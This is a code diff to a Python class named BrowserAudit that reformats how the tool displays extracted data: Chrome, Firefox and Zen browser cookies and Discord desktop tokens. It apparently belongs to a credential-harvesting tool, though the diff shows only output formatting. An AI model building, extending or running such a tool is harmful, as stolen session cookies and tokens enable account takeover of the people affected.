@@ -233,22 +233,23 @@ class BrowserAudit:
             print(f"{self.COLORS['GREEN']}[OK] Discord tokens extracted{self.COLORS['RESET']}\n")
 
     def display_results(self):
-        print(f"\n{self.COLORS['BLUE']}[===========================================]{self.COLORS['RESET']}")
-        print(f"{self.COLORS['BLUE']}    EXTRACTED DATA{self.COLORS['RESET']}")
-        print(f"{self.COLORS['BLUE']}[===========================================]{self.COLORS['RESET']}\n")
+        print(f"\n{self.COLORS['BLUE']}{'=' * 60}{self.COLORS['RESET']}")
+        print(f"{self.COLORS['BLUE']}{'EXTRACTED SENSITIVE DATA':^60}{self.COLORS['RESET']}")
+        print(f"{self.COLORS['BLUE']}{'=' * 60}{self.COLORS['RESET']}\n")
 
-        files_to_display = [
+        sections = [
             ("chrome_cookies.txt", "Chrome Cookies"),
             ("firefox_cookies.txt", "Firefox Cookies"),
             ("zen_cookies.txt", "Zen Cookies"),
             ("discord_tokens.txt", "Discord Desktop Tokens"),
         ]
 
-        for filename, title in files_to_display:
+        for filename, title in sections:
             filepath = self.cookies_dir / filename
+            print(f"{self.COLORS['MAGENTA']}{title}:{self.COLORS['RESET']}")
+            print(f"{self.COLORS['BLUE']}{'-' * 60}{self.COLORS['RESET']}")
+
             if filepath.exists():
-                print(f"\n{self.COLORS['MAGENTA']}[{title}]{self.COLORS['RESET']}")
-                print(f"{self.COLORS['BLUE']}{'-' * 50}{self.COLORS['RESET']}")
                 try:
                     with open(filepath, 'r') as f:
                         content = f.read().strip()
@@ -257,11 +258,11 @@ class BrowserAudit:
                         else:
                             print(f"{self.COLORS['CYAN']}(no data found){self.COLORS['RESET']}")
                 except Exception as e:
-                    print(f"{self.COLORS['RED']}Error reading {filename}: {e}{self.COLORS['RESET']}")
+                    print(f"{self.COLORS['RED']}Error: {e}{self.COLORS['RESET']}")
             else:
-                print(f"\n{self.COLORS['MAGENTA']}[{title}]{self.COLORS['RESET']}")
-                print(f"{self.COLORS['BLUE']}{'-' * 50}{self.COLORS['RESET']}")
                 print(f"{self.COLORS['CYAN']}(no data found){self.COLORS['RESET']}")
+
+            print()  # Blank line between sections
 
     def run(self):
         print(f"\n{self.COLORS['BLUE']}[===========================================]{self.COLORS['RESET']}")
